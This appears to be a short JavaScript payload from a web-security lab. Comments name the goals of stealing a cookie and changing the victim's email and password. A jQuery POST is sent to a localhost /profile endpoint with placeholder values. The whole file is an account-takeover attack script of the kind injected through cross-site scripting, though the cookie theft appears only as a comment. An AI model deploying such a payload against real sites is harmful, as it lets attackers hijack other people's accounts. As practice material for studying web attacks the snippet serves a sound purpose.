// Target
// Steal cookie
// Send POST to change email and password

const body = {
  email: "ABC.com",
  password: "",
};
$.post("http://127.0.0.1:5000/profile", body, (data, status) => {
  console.log(data);
});